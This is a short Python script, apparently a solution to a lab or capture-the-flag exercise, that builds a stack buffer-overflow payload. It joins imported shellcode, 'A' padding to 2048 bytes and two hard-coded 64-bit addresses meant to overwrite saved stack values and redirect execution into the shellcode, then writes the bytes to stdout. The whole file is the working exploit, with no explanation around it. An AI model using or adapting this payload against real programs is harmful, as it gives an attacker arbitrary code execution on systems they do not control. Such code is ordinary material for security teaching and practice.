#!/usr/bin/env python3

import sys

from shellcode import shellcode
input = shellcode + b'A' * (2048 - len(shellcode)) + (0x7ffffff6cbb0).to_bytes(8, 'little') + (0x7ffffff6d3c8).to_bytes(8, 'little')
sys.stdout.buffer.write(input)